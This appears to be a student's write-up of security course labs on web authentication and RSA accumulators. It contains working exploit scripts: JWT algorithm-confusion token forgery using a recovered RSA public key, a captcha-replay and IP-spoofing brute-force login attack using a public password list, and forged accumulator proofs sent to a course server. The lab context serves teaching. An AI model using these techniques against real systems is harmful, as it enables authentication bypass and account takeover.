\u0026#39;CNS-password\u0026#39; }, } @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#34;GET\u0026#34;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#34;username\u0026#34;] password = request.form[\u0026#39;password\u0026#39;] print(username, password) if username in users and users[username][\u0026#39;password\u0026#39;] == password: response = make_response(redirect(\u0026#39;/\u0026#39;)) response.set_cookie(\u0026#39;username\u0026#39;, hashlib.sha256(password.encode()).hexdigest()) return response, 200 return \u0026#39;Invalid username or password!\u0026#39;, 401 elif request.method == \u0026#34;GET\u0026#34; and request.cookies.get(\u0026#34;username\u0026#34;) == hashlib.sha256(b\u0026#39;CNS-password\u0026#39;).hexdigest(): return \u0026#34;Success\u0026#34;, 200 elif request.method == \u0026#34;GET\u0026#34; and request.cookies.get(\u0026#34;username\u0026#34;) != hashlib.sha256(b\u0026#39;CNS-password\u0026#39;).hexdigest(): if request.cookies.get(\u0026#34;username\u0026#34;) != None: return \u0026#34;Unsuccess\u0026#34;, 401 else: return \u0026#34;Hello\u0026#34;, 401 if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#34;127.0.0.1\u0026#34;, port=7777, debug=True) ::: Flag: CNS{CooK135_4R3_d3L1c1ou2}\nJWT-Based :::spoiler Description\nIn this subtask, you will implement JWT-based authentication. First, I will execute \u0026lsquo;POST /\u0026rsquo;, which contains two fields: \u0026lsquo;username\u0026rsquo; and \u0026lsquo;password\u0026rsquo;, in application/x-www-form-urlencoded format. Your service should output the token directly in the HTTP response body. Then I will execute \u0026lsquo;GET /\u0026rsquo; with the token. :::\nb) # Basic HTTP Authentication: Pros: Simple to implement and widely supported by browsers and servers. No additional server-side storage required, as the credentials are sent with each request. Cons: The credentials are sent with every request, which can increase the risk if the connection is not secured with HTTPS. The password is base64-encoded, which is not a secure encryption method. It can be easily decoded if intercepted. Basic HTTP Authentication is a simple and widely supported method, but it has security limitations. Sending credentials with each request can be risky, especially if the connection is not secured. Additionally, base64 encoding doesn\u0026rsquo;t provide encryption, making it vulnerable to interception. Cookie-based Authentication: Pros: Stateless on the server side. The server doesn\u0026rsquo;t need to store user sessions as the session ID is included with each request. Session ID is stored on the client-side, making it less vulnerable to interception. Cons: Requires server-side storage or a session management system to handle session IDs securely. Vulnerable to session hijacking if proper security measures like session expiration and secure cookie flags are not implemented. Cookie-based Authentication is more secure than Basic Authentication as the session ID is stored on the client-side. However, it requires server-side storage or session management systems. If proper security measures are not implemented, session hijacking attacks can occur. JWT-based Authentication: Pros: Stateless on the server side. The server doesn\u0026rsquo;t need to store session data as all required information is encoded in the JWT. Enables easy scalability and interoperability, as JWTs can be used across multiple services or distributed systems. Allows for fine-grained control by including user-related data (claims) within the token. Cons: The server needs to maintain the secret key securely to prevent unauthorized JWT issuance or tampering. If a JWT is compromised, it remains valid until its expiration time, as tokens are self-contained and don\u0026rsquo;t require round-trips to the server for validation. JWT-based Authentication is a stateless and scalable method, making it suitable for distributed systems. It allows for fine-grained control and doesn\u0026rsquo;t require server-side storage. However, the server needs to securely manage the secret key. If a JWT is compromised, it remains valid until expiration. c) # Recon # Alice implemented a great web service that uses the JWT stored in the cookie to authenticate users. So, we can access the token as below:\nHeader: {\u0026quot;alg\u0026quot;:\u0026quot;RS256\u0026quot;,\u0026quot;typ\u0026quot;:\u0026quot;JWT\u0026quot;} Payload: {\u0026quot;username\u0026quot;:\u0026quot;guest\u0026quot;,\u0026quot;flag1\u0026quot;:\u0026quot;CNS{JW7_15_N07_a_900d_PLACE_70_H1DE_5ecrE75}\u0026quot;,\u0026quot;exp\u0026quot;:1686041128} :::spoiler Signature with base64 encode: Wz1mXQiYh3OvEdrQ2y1nWTwAbNs7HE1rjBQ8HBv9DhFLax9im4J4CQqS-vXymyuLJGXnrq18b4HlurRwjoIo1036ecsHM_dQfkkUZm9NqhYMmRwl1DRjQx7RvH4FccBIXhhOBu2Jzw3pSHfILFmMUqg26weWiu4f-gE3u5by0ylMqfIwZtG-J-VLA9QFSth9vobjM610MNIuTPQODH9r8Cy1cpttZ2QPuHfPMPARF11kIIJ-ebDXnV6t1I7FB6Nv4-Mk3JUsBOKBRMVh1eiZ2_3Xx4YzNUfZb5LQzCMcjsMpHWoV1WvIEEMW5SXAVOCbCyRUhcVtqXVI_VodM_hnKA ::: Flag 1: Just hide in cookie and use base64 online decoder, you\u0026rsquo;ll obtain CNS{JW7_15_N07_a_900d_PLACE_70_H1DE_5ecrE75} Exp for another flag # The description said another flag is hidden in the account with the username admin. Thus, we can tamper the token that used different algorithm to sign the payload.\nProblem 1: If we have to used another algorithm like HS256, we need RSA public key to sing the payload. What is public key(n, e) in this token? Problem 2: How to generate .pem file? Problem 3: How to implement JWT signature to sign the payload? Find the N and e of RSA public key We note that every time your refresh the web page, the tokens are quite different because of different expired time. So, how can we used these plaintext and signature pair to construct original N $$ \\downarrow\\ m_1^e \\equiv c_1\\ (mod\\ N)\\ m_2^e \\equiv c_2\\ (mod\\ N)\\ m_3^e \\equiv c_3\\ (mod\\ N)\\ \\downarrow\\ m_1^e - c_1\\ = \\alpha N\\ m_2^e - c_2\\ = \\beta N\\ m_3^e - c_3\\ = \\gamma N $$ Thus, we can find $N$ using $gcd(αN, βN, γN)=N$. Note that the large number calculation can use gmpy2 library.\n:::danger Remember the work flow of signature in RSA: You can refer this page The work flow is b'hello'$\\to$do hash by sha256$\\to$do padding bypkcs#1v1.5$\\to$ then sign$\\to$ciphertext\nNote 2 From TA: PKCS v1.5 padding 在encryption與signature的操作不太一樣喔，有 random bytes的是encryption，詳細可以參考spec ::: :::spoiler Exp Script\nimport base64 import gmpy2 from Crypto.Signature import pkcs1_15 from Crypto.Hash import SHA256 from base64 import urlsafe_b64encode, urlsafe_b64decode import jwt from Crypto.PublicKey import RSA \u0026#39;\u0026#39;\u0026#39; Compute RSA Public Key - (N, e) \u0026#39;\u0026#39;\u0026#39; def initialize(message, c_or_m): if c_or_m == \u0026#39;c\u0026#39;: return gmpy2.mpz(int(base64.urlsafe_b64decode(message).hex(), 16)) elif c_or_m == \u0026#39;m\u0026#39;: return gmpy2.mpz(int(pkcs1_15._EMSA_PKCS1_V1_5_ENCODE(SHA256.new(message.encode()), 256).hex(), 16)) ciphertext = { 0 : \u0026#34;AMpJDyvv2burdO35LvbtykwdhCOItlRv0pyvE3WB7ysDqrpmy0ZbIJfkvddHLBMTLad9jgz9DV9B_Y4aPNIAs6_QibK22BoPMwmbhE_qw88rMjpf5Ph-SmmuTb51VLz4gO9QEX03AekBD5VHYHttuyln4AJdZ8y0-VUCvlyi_lEDqmRPpCnCUN1tuK6KcnKVa0IfaB1kTKzBFEFtL3oPrC9Qtp5bkYxrPXslhYhlCHRDjL_TrGn_A5g5CwONHFNczVNRig5oSyY6XV49vAJrxWMUeNKXkU49JLgGYF01tQvRDPi7m7gtTVjhQLVTV_-qkYuVbGr2bgx2PhSheA2Xcg==\u0026#34;, 1 : \u0026#34;R8QnOGx9aBt7Hjh6wXG3JmqhutNB7a7oCNWZvVUg4bhtdVWpG1WyehCczOnBs-uLcZnXg4AO6ppf4Qt2p70s7dCKsSv3YJ2L_BBXFWjlgSmNlfxTznGgMY49_0l8hmSB4A1TRbIrxLmncZmmHiTt7Fm-sUNqCl097myfu-54sMNunZktpNrQfj9PYrQuDf2HmEfw-7uDGQPThSl0vjTBQDW3adnRZOKtQ1n-xDucEVy5twxS6Tn8LNs25xn7u2ts8qFrVHFe_WlihBmZgGjmgjvkbhcKinQ3uLFx5XRw_kpQ1yjN9NMZcELV_XeGLExuRIS4TundCGYLuDIp8NKLhQ==\u0026#34;, 2 : \u0026#34;BfwxVR2DBeti1TdWm37Mj9V6hYOz-tdTisf7Lu98tz-jQgHWDUkM0RDzjUYha6wH7ZCqXGn8Les4Lk-k5zbpT_flEtu6e_w5wEKJbm2-i6OeZxZLiXLP0aOs-sSVmkdcRR-3tGWSuA6SL4VQokZUTv-4Td5FrurU6NKi6ZuwSWk8F5O6MIBi7Boncv6SnWtH93GsHCeXlVmQKvSWH0dPJDS00UwvtNSQ9moF0zhuBWIZqhjS89VWwWt5LJnbtzkEGSM5MxYsk-F8xKntwO9oiPYWeK-mo9JvGg6RnM5Poanzzbmcdw055X1wseBS2Pbv1pPEN0g6mHKuRQoc7slWEA==\u0026#34;, 3 : \u0026#34;M74GetHK2cRPuaB9HFrXYhMX8iAaQmyEOCC2xIGaYDTgZ0EfbcyST5acMfHmlLZ4ylsCVzIc3uoRWHnKo-KTTn4ECCWpdAzbzKvlpxurm4zF1b1oAfsnw7Mdv68XR1X7FEpnGT2FnXJNTbhEOwc2Bb8qgy8lYVXhIKuL-0734JWjs9V4V3UnC2TBcXfwRR1xddeXzEYoyGAm_vIY9T051jTT0OljDruQhIDH1kPTuBrJNXuedDlIc9BXZzPcBsKPdRhFb7EET8C-UheTwDM8tLAykWNcegf0-VVqP92bC80scJEgKV7HHtPU6nh7FA0_i49QSMndRsFB_96RjdTSQA==\u0026#34; } plaintext = { 0 : \u0026#34;eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZmxhZzEiOiJDTlN7Slc3XzE1X04wN19hXzkwMGRfUExBQ0VfNzBfSDFERV81ZWNyRTc1fSIsImV4cCI6MTY4NjU4Mzc1OX0\u0026#34;, 1 : \u0026#34;eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZmxhZzEiOiJDTlN7Slc3XzE1X04wN19hXzkwMGRfUExBQ0VfNzBfSDFERV81ZWNyRTc1fSIsImV4cCI6MTY4NjU4MzgwNX0\u0026#34;, 2 : \u0026#34;eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZmxhZzEiOiJDTlN7Slc3XzE1X04wN19hXzkwMGRfUExBQ0VfNzBfSDFERV81ZWNyRTc1fSIsImV4cCI6MTY4NjU4Mzg1MH0\u0026#34;, 3 : \u0026#34;eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZmxhZzEiOiJDTlN7Slc3XzE1X04wN19hXzkwMGRfUExBQ0VfNzBfSDFERV81ZWNyRTc1fSIsImV4cCI6MTY4NjU4Mzg4Mn0\u0026#34; } c = {} m = {} for i in range(4): c[i] = initialize(ciphertext[i], \u0026#39;c\u0026#39;) m[i] = initialize(plaintext[i], \u0026#39;m\u0026#39;) e = gmpy2.mpz(65537) # The default parameter in openssl a_N = c[0]**e - m[0] b_N = c[1]**e - m[1] c_N = c[2]**e - m[2] n = gmpy2.gcd(a_N, b_N, c_N) :::\nGenerate public-key.pem file Now, we know what N is, so we can generate a .pem file with properly format. According to this page, the script is show as below: :::spoiler Whole script\nfrom Crypto.PublicKey import RSA n = 0x8ffcd5ae700b26f96316817101f254071b082b209196371eabf52d9a5e80eb64d5f4c4a1533e147f3c27b7e941622c25db41f21f502f6fd94d4b994b9448d824f24d27845da8cf5f8e10ddd1ac05ef54c490aaa7ac028efafe205d0633c62cd72ff3f874497a67c5458adaec91be0859e82a300f345ecd007115b9cb653e6b9ba670ea61e31b4b4b13bcba8cb324777e751c6b9fe531f5c6d61dd459674e57d08c03e1202f66b835220d097a9429fa5dcc22f8fbf80ddb1bb0b59ad98d4b462619ec3642ea1f6fdb7420b9602b4a8c4f66aaa0932b36d7ab4102392cd71803076acf2947cd253ea5580a0c1228ddd7647ef3d6e7c43f3d5d9654cf0d47d390d1 e = 0x10001 key_params = (n, e) key = RSA.construct(key_params) f = open(\u0026#39;./rsa-public-key.pem\u0026#39;, \u0026#39;w\u0026#39;) f.write(key.exportKey().decode()) f.close() :::\nImplement JWT to sign the payload by using public key Note that you must make sure that the public key has a new line symbol at the end of the file :::spoiler Whole Script\nimport jwt import hashlib import hmac key = b\u0026#34;-----BEGIN PUBLIC KEY-----\\n\\ MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAj/zVrnALJvljFoFxAfJU\\n\\ BxsIKyCRljceq/Utml6A62TV9MShUz4Ufzwnt+lBYiwl20HyH1Avb9lNS5lLlEjY\\n\\ JPJNJ4RdqM9fjhDd0awF71TEkKqnrAKO+v4gXQYzxizXL/P4dEl6Z8VFitrskb4I\\n\\ WegqMA80Xs0AcRW5y2U+a5umcOph4xtLSxO8uoyzJHd+dRxrn+Ux9cbWHdRZZ05X\\n\\ 0IwD4SAvZrg1Ig0JepQp+l3MIvj7+A3bG7C1mtmNS0YmGew2Quofb9t0ILlgK0qM\\n\\ T2aqoJMrNterQQI5LNcYAwdqzylHzSU+pVgKDBIo3ddkfvPW58Q/PV2WVM8NR9OQ\\n\\ 0QIDAQAB\\n\\ -----END PUBLIC KEY-----\\n\u0026#34; header = \u0026#39;{\u0026#34;alg\u0026#34;: \u0026#34;HS256\u0026#34;, \u0026#34;typ\u0026#34;: \u0026#34;JWT\u0026#34;}\u0026#39; payload = \u0026#39;{\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;flag1\u0026#34;:\u0026#34;CNS{JW7_15_N07_a_900d_PLACE_70_H1DE_5ecrE75}\u0026#34;,\u0026#34;exp\u0026#34;:1786583759}\u0026#39; header = base64.urlsafe_b64encode(bytes(header, \u0026#34;utf-8\u0026#34;)).decode().replace(\u0026#34;=\u0026#34;, \u0026#34;\u0026#34;).encode() payload = base64.urlsafe_b64encode(bytes(payload, \u0026#34;utf-8\u0026#34;)).decode().replace(\u0026#34;=\u0026#34;, \u0026#34;\u0026#34;).encode() sig = hmac.new(key, header + b\u0026#39;.\u0026#39; + payload, hashlib.sha256).digest().strip() sig = base64.urlsafe_b64encode(sig).decode().replace(\u0026#34;=\u0026#34;, \u0026#34;\u0026#34;) jwt = \u0026#39;{}.{}.{}\u0026#39;.format(header.decode(), payload.decode(), sig) print(jwt) :::\nThen replace the web page original token and you\u0026rsquo;ll get the flag Note that the expire time in payload should be careful.\nFlag 2: CNS{4L9_15_un7Ru573d_u53r_1nPU7} d) # Just follow the library code :::spoiler Script Code \u0026#39;\u0026#39;\u0026#39; Implement TOTP \u0026#39;\u0026#39;\u0026#39; import calendar import datetime import hashlib import time from typing import Any, Optional, Union import unicodedata from hmac import compare_digest from typing import Dict, Optional, Union from urllib.parse import quote, urlencode, urlparse import base64 import hmac class OTP(object): def __init__( self, s: str, digits: int = 6, digest: Any = hashlib.sha1, name: Optional[str] = None, issuer: Optional[str] = None, ) -\u0026gt; None: self.digits = digits if digits \u0026gt; 10: raise ValueError(\u0026#34;digits must be no greater than 10\u0026#34;) self.digest = digest self.secret = s self.name = name or \u0026#34;Secret\u0026#34; self.issuer = issuer def generate_otp(self, input: int) -\u0026gt; str: if input \u0026lt; 0: raise ValueError(\u0026#34;input must be positive integer\u0026#34;) hasher = hmac.new(self.byte_secret(), self.int_to_bytestring(input), self.digest) hmac_hash = bytearray(hasher.digest()) offset = hmac_hash[-1] \u0026amp; 0xF code = ( (hmac_hash[offset] \u0026amp; 0x7F) \u0026lt;\u0026lt; 24 | (hmac_hash[offset + 1] \u0026amp; 0xFF) \u0026lt;\u0026lt; 16 | (hmac_hash[offset + 2] \u0026amp; 0xFF) \u0026lt;\u0026lt; 8 | (hmac_hash[offset + 3] \u0026amp; 0xFF) ) str_code = str(10_000_000_000 + (code % 10**self.digits)) return str_code[-self.digits :] def byte_secret(self) -\u0026gt; bytes: secret = self.secret missing_padding = len(secret) % 8 if missing_padding != 0: secret += \u0026#34;=\u0026#34; * (8 - missing_padding) return base64.b32decode(secret, casefold=True) @staticmethod def int_to_bytestring(i: int, padding: int = 8) -\u0026gt; bytes: result = bytearray() while i != 0: result.append(i \u0026amp; 0xFF) i \u0026gt;\u0026gt;= 8 return bytes(bytearray(reversed(result)).rjust(padding, b\u0026#34;\\0\u0026#34;)) class TOTP(OTP): def __init__( self, s: str, digits: int = 6, digest: Any = None, name: Optional[str] = None, issuer: Optional[str] = None, interval: int = 30 ) -\u0026gt; None: if digest is None: digest = hashlib.sha1 self.interval = interval super().__init__(s=s, digits=digits, digest=digest, name=name, issuer=issuer) def now(self) -\u0026gt; str: return self.generate_otp(self.timecode(datetime.datetime.now())) def timecode(self, for_time: datetime.datetime) -\u0026gt; int: if for_time.tzinfo: return int(calendar.timegm(for_time.utctimetuple()) / self.interval) else: return int(time.mktime(for_time.timetuple()) / self.interval) \u0026#39;\u0026#39;\u0026#39; Using TOTP solve problem \u0026#39;\u0026#39;\u0026#39; import pyotp import time from pwn import * def TOTP_new(shared_secret): totp = TOTP(shared_secret) return totp.now() def TOTP_old(shared_secret): totp = pyotp.TOTP(shared_secret) return totp.now() test = \u0026#34;5VZG4WBEPL3NLPG7QTLDLD3EWOM37IDE\u0026#34; print(TOTP_new(test)) print(TOTP_old(test)) # r = remote(\u0026#34;cns.csie.org\u0026#34;, 17504) # context.arch = \u0026#39;amd64\u0026#39; # r.recvline() # for i in range(128): # key = r.recvline().strip().split()[-1].decode() # r.sendline(TOTP_new(key).encode()) # r.interactive() ::: Flag: CNS{2FA_15_9R347_y0U_5H0Uld_h4v3_0N3} e) # Hint 1: There are strings in the cookie that look like hashes, what could they be? Hint 2: If you failed to figure out what hint 1 means, here’s another method. It’s the era of Machine Learning. Even babies know what Convolutional Neural Network is. Hint 3: What are some common ways to get the user’s IP when the web service is behind a reverse proxy? Are these common practices secure? Recon and Hint # From the hint and description, we know that our goal is to brute force this login authentication with captcha challenge and rate limitations(3 attempts). As the reference here, we can bypass the rate limitation. As the hint above, we have 2 types attack, CNN recognition, replay attack, and I choose replay attack, btw. The replay attack is just fit the same cookie and captcha parameter at each attack, then we can bypass this captcha. How to exploit? # Access http://cns.csie.org:17505 in Burp Suite Intercept the packet and send to Intruder Generate variety IP f = open(\u0026#34;./Gen_IP.txt\u0026#34;, \u0026#34;w\u0026#34;) for i in range(256): for j in range(256): f.write(\u0026#34;140.112.\u0026#34;+str(i)+\u0026#34;.\u0026#34;+str(j)+\u0026#34;\\n\u0026#34;) f.close() wget password payload $ wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/xato-net-10-million-passwords-10000.txt Set Payload \u0026amp; Start Attack Use Pitchfork as your attack type :::spoiler Screenshot ::: Password: everett Flag: CNS{8Ru73_f0Rc3_Pr3v3n710N_C4n_83_C0mPl1c473d} f) # One modern authentication method is the FIDO2 security key. This is a physical device that can be used to sign in to web-based applications and Windows 10 devices with your Azure AD account without entering a username or password. It is based on the open standards of FIDO2, which include the WebAuthn protocol and the Client to Authentication Protocol (CTAP).\nThe FIDO2 security key works by generating a public-private key pair for each account that you register with it. The private key is stored securely on the device, and the public key is sent to the service provider (such as Azure AD) along with a randomly generated attestation certificate that proves the authenticity of the device. When you sign in with the FIDO2 security key, the service provider sends a nonce (a random number) to the device, which signs it with the private key and sends it back. The service provider then verifies the signature using the public key and grants access.\nThe FIDO2 security key method is better than traditional methods such as passwords or tokens for several reasons:\nIt is more secure, as it prevents phishing, replay, and man-in-the-middle attacks. The private key never leaves the device, and the attestation certificate prevents spoofing or cloning of the device. It is more convenient, as it does not require remembering or typing passwords or codes. The user only needs to insert the device and provide a second factor such as a fingerprint or a PIN. It is more scalable, as it can work across thousands of accounts and services that support FIDO2 without sharing any secrets.\n4. Accumulator # a) # Just following the TODO hint and complete the each sub-function :::spoiler Exp from Crypto.Util.number import getPrime, isPrime, GCD, bytes_to_long, long_to_bytes, inverse from random import randrange from hashlib import sha256 import numpy as np class RSA_Accumulator: def __init__(self, Nbits): self.Setup(Nbits) # Run Trusted Setup to get the N of a RSA group self.memberSet = [] # The memberSet S def Setup(self, Nbits): \u0026#39;\u0026#39;\u0026#39; Set up the RSA Group and generate a generator g. * RSA Accumulator needs trusted setup from third-party. -\u0026gt; The factor of N should not be known by anyone. \u0026#39;\u0026#39;\u0026#39; self.N = getPrime((Nbits+1)//2) * getPrime((Nbits+1)//2) self.N = 118166153201091422745075581047834754808656318506582059918250736240527000218333900890558674423046670734337546875938786060887854493354320062840519232300439946274194598991584933262120097035915944139948564721903245872873636662231635587182627311074335128195338000702520696618456950964940369684997735067088270882537 g = randrange(1,self.N) while (GCD(g, self.N) != 1 or g == 1): g = randrange(1,self.N) self.g = g self.g = 102051368806489104968940135232506917072685495379367570526809603586735868728055130832450576227989175359207682641748992283183781107769793076159733250007462779341283086743497222627311279686407991735966924383065162712675112994555587377787405876645776970439432770422301055215461963444317007474211864224999189899243 @staticmethod def HashToPrime(content): \u0026#39;\u0026#39;\u0026#39; Hash a content to Prime domain. The content must be encoded in bytes. \u0026#39;\u0026#39;\u0026#39; def PrimeTest(p): return isPrime(p) and p \u0026gt; 2 def H(_y): return bytes_to_long(sha256(_y).digest()) y = H(content) while not PrimeTest(y): y = H(long_to_bytes(y)) return y def add(self, content): \u0026#39;\u0026#39;\u0026#39; Add an content to memberSet \u0026#39;\u0026#39;\u0026#39; s = self.HashToPrime(content) self.memberSet.append(s) def Digest(self): \u0026#39;\u0026#39;\u0026#39; Digest all the contents in memberSet. \u0026#39;\u0026#39;\u0026#39; digest = self.g # TODO: Digest all the elements in memberSet. # Hint: digest = g ^ ( product of \u0026#34;all the primes in memberSet\u0026#34; ) for i in self.memberSet: digest = pow(digest, i, self.N) return digest def MembershipProof(self, content): m = self.HashToPrime(content) if m not in self.memberSet: raise ValueError proof = self.g # TODO: Make a membership proof for m. # Hint: proof = g ^ ( product of \u0026#34;all the primes in memberSet except for m\u0026#34; ) for i in self.memberSet: if m != i: proof = pow(proof, i, self.N) return proof def MembershipVerification(self, N, content, d, proof) -\u0026gt; bool: m = self.HashToPrime(content) # TODO: Verify the membership proof of m. # Hint: Check \u0026#34;proof ^ m == d\u0026#34; return True if pow(proof, m, self.N) == d else False def NonMembershipProof(self, content): m = self.HashToPrime(content) if m in self.memberSet: raise ValueError # TODO: Make a non-membership proof for m. # Hint: let delta = product of \u0026#34;all the primes in memberSet except for m. # find (a, b) satisfy a * m + b * delta = 1 # proof = (g^a, b) # p.s. since gcd(m, delta) == 1, you can use xgcd(Extended Euclidean algorithm) to find (a, b) def extended_gcd(a, b): if a == 0: return b, 0, 1 else: gcd, x, y = extended_gcd(b % a, a) return gcd, y - (b // a) * x, x delta = 1 for i in self.memberSet: delta *= i gcd, a, b = extended_gcd(m, delta) result = pow(self.g, a, N) return (result, b) def NonMembershipVerification(self, N, content, d, proof, g): m = self.HashToPrime(content) # TODO: Verify the non-membership proof of m. # Hint: Check \u0026#34;(g^a)^m * digest^b == g^(a*m + b*delta) == g\u0026#34; second_power = pow(d, proof[1], N) return (pow(proof[0], m, N) * second_power) % N == g if __name__ == \u0026#34;__main__\u0026#34;: A = RSA_Accumulator(1024) A.add(b\u0026#34;Hello!\u0026#34;) A.add(b\u0026#34;Test!\u0026#34;) A.add(b\u0026#34;CNS\u0026#34;) A.add(b\u0026#34;accumulatorrrrrr\u0026#34;) d = A.Digest() N = A.N g = A.g proof = A.MembershipProof(b\u0026#34;accumulatorrrrrr\u0026#34;) if A.MembershipVerification(N, b\u0026#34;accumulatorrrrrr\u0026#34;, d, proof): print( \u0026#34;\u0026#39;accumulatorrrrrr\u0026#39; is in the set.\u0026#34; ) else: print( \u0026#34;The proof is wrong.\u0026#34; ) proof = A.NonMembershipProof(b\u0026#34;QAQ\u0026#34;) if A.NonMembershipVerification(N, b\u0026#34;QAQ\u0026#34;, d, proof, g): print( \u0026#34;\u0026#39;QAQ\u0026#39; is not in the set.\u0026#34; ) else: print( \u0026#34;The proof is wrong.\u0026#34; ) ::: b) Really thx for R11944034 許智翔 for inspiration # Goal: We have to construct a fake member $m\u0026rsquo; \\notin S$ We know: $$ p=g^{\\prod \\limits_{s \\in S/{m\u0026rsquo;}}S}=g^{\\prod \\limits_{s \\in S}S}=d $$ :+1:If we used normal $p$ and normal $m \\in S$: $$ p^m=g^{\\prod \\limits_{s \\in S/{m}}S*m}=g^{\\prod \\limits_{s \\in S}S}=d $$ :-1:If we used normal $p$ and new message $m\u0026rsquo;$: $$ p^{m\u0026rsquo;}=g^{\\prod \\limits_{s \\in S}S \\cdot m\u0026rsquo;}=d^{m\u0026rsquo;} \\neq d $$ :+1:If we used fake proof $p\u0026rsquo;$ and new message $m\u0026rsquo;$: $$ {p\u0026rsquo;}^{m\u0026rsquo;}=d^{{{m\u0026rsquo;}}^{-1} *m\u0026rsquo;}=d $$ We can control proof $p\u0026rsquo;$ and new message $m\u0026rsquo;$, so we need to construct fake proof $p\u0026rsquo;$ $$ p\u0026rsquo; \\equiv d^{{m\u0026rsquo;}^{-1}}\\ (mod\\ N) \\equiv p^{{m\u0026rsquo;}^{-1}\\ (mod\\ \\varphi(N))}\\ (mod\\ N)\\ -\\ Euler\\ Theorem $$ :::info To achieve this attack, one condition must be met: We have to compute $\\varphi (n)$, so we need the private key of RSA ::: Then we can use any member that\u0026rsquo;s not in member set but still can pass the verification. :::spoiler Whole Script from pwn import * from accumulator import RSA_Accumulator from Crypto.Util.number import inverse r = remote(\u0026#39;cns.csie.org\u0026#39;, 4001) context.arch = \u0026#39;amd64\u0026#39; p = 0xfe7fa2d93be7396c7172a7186f4e561949f53e436a7ed65da22786637b7e76081f65b972be84ea612787a07878c1bf9454edf81059f84158efe34b4207f96d71 q = 0xb76082ea921f3d4729e59d765ff014ad745b6421f1bacc359417e0c2a1aaa318bd96ba0f6476e09bd1db72fa4dfc7fa5aa0ee1bef7bc4f268fb42673e539d3b1 def bad_setup(): acc = RSA_Accumulator(1024) acc.N = p * q acc.g = 0xa8ccac65582e3accb0e246c4d79b9d054e85e086b6d5c48df6f79bf60ad4c77d797ba7fdba0b0a83071f16e427bff7d7d7ab768d4694f90a5eef5278201f8848221b998a7f5322a66f9eac87d5d4f801a2af3fa7a983f9678732b6b16b40c2e2b8e5612e9834f2e64b0aa91f91c479113b0d263dc81572f5b5d367d4911008cd acc.add(b\u0026#34;Member0\u0026#34;) acc.add(b\u0026#34;Member1\u0026#34;) acc.add(b\u0026#34;Member2\u0026#34;) digest = acc.Digest() return acc, digest for i in range(4): r.recvline() phi = (p-1)*(q-1) acc, digest = bad_setup() message = b\u0026#34;Member3\u0026#34; # A new member that is not in member set m = acc.HashToPrime(message) inv_m = inverse(m, phi) proof_new = pow(digest, inv_m, acc.N) # Construct a fake proof r.sendline(b\u0026#39;0\u0026#39;) r.sendline(message) r.sendline(str(proof_new).encode()) r.interactive() ::: Flag: cns{ph4k3_m3m83r5H1p!}\nc) # Like the previous question mentioned, we\u0026rsquo;d like to give a fake proof that can pass the verification process even the member is not in member set.\nWe know that if $gcd(m,\\ delta)=1$, then we can find coefficient $a$ and $b$ so that $a\\cdot m+b\\cdot delta=1$: $$ delta={\\prod \\limits_{s \\in S}s} $$ :+1:If we used normal $p$ and normal $m \\in S$: $$ (g^a)^m\\cdot d^b=g^{a\\cdot m}\\cdot g^{b\\cdot ({\\prod \\limits_{s \\in S}s})}=g^{a\\cdot m+b\\cdot ({\\prod \\limits_{s \\in S}s})}=g $$ :-1:If we used normal $proof=(g^a, b)$ and new message $m\u0026rsquo;$: You can not find $a$ and $b$ to fit $a\\cdot m+b\\cdot delta=1$ :+1:If we used fake proof $proof\u0026rsquo;=(g^{a\u0026rsquo;}, b\u0026rsquo;)$ and new message $m\u0026rsquo;$: If $a\u0026rsquo;=m^{-1}, b=0$ $$ (g^{a\u0026rsquo;})^m\\cdot d^b=g^{m^{-1}\\cdot m}\\cdot g^{b\\cdot ({\\prod \\limits_{s \\in S}s})}=g^{1+0}=g $$ :::spoiler Whole Script from pwn import * from accumulator import RSA_Accumulator from Crypto.Util.number import inverse r = remote(\u0026#39;cns.csie.org\u0026#39;, 4001) context.arch = \u0026#39;amd64\u0026#39; p = 0xfe7fa2d93be7396c7172a7186f4e561949f53e436a7ed65da22786637b7e76081f65b972be84ea612787a07878c1bf9454edf81059f84158efe34b4207f96d71 q = 0xb76082ea921f3d4729e59d765ff014ad745b6421f1bacc359417e0c2a1aaa318bd96ba0f6476e09bd1db72fa4dfc7fa5aa0ee1bef7bc4f268fb42673e539d3b1 def bad_setup(): acc = RSA_Accumulator(1024) acc.N = p * q acc.g = 0xa8ccac65582e3accb0e246c4d79b9d054e85e086b6d5c48df6f79bf60ad4c77d797ba7fdba0b0a83071f16e427bff7d7d7ab768d4694f90a5eef5278201f8848221b998a7f5322a66f9eac87d5d4f801a2af3fa7a983f9678732b6b16b40c2e2b8e5612e9834f2e64b0aa91f91c479113b0d263dc81572f5b5d367d4911008cd acc.add(b\u0026#34;Member0\u0026#34;) acc.add(b\u0026#34;Member1\u0026#34;) acc.add(b\u0026#34;Member2\u0026#34;) digest = acc.Digest() return acc, digest for i in range(4): r.recvline() phi = (p-1)*(q-1) acc, digest = bad_setup() message = b\u0026#34;Member0\u0026#34; # A old member that is in member set proof_fake = acc.NonMembershipProof(message) m = acc.HashToPrime(message) \u0026#39;\u0026#39;\u0026#39; Construct fake proof \u0026#39;\u0026#39;\u0026#39; a = inverse(m, phi) delta = 1 for i in acc.memberSet: delta *= i b = inverse(delta, phi) g_a = pow(acc.g, a, acc.N) r.sendline(b\u0026#39;1\u0026#39;) r.sendline(message) r.sendline(str(g_a).encode()) r.sendline(b\u0026#39;0\u0026#39;) r.interactive() ::: Flag: cns{N0N_n0n_m3M83RSh1p!}\nd) # (Skip)\nReference # 1. DDoS # 使用Wireshark分析並發現DDoS攻擊 Kali Linux網絡掃描秘籍第六章拒絕服務(二) NTP放大DDoS攻擊 分散式阻斷服務攻擊(DDoS)趨勢與防護 3. Web Authentication # Basic Authentication # How To Create Flask Web App In Digital Ocean Using App 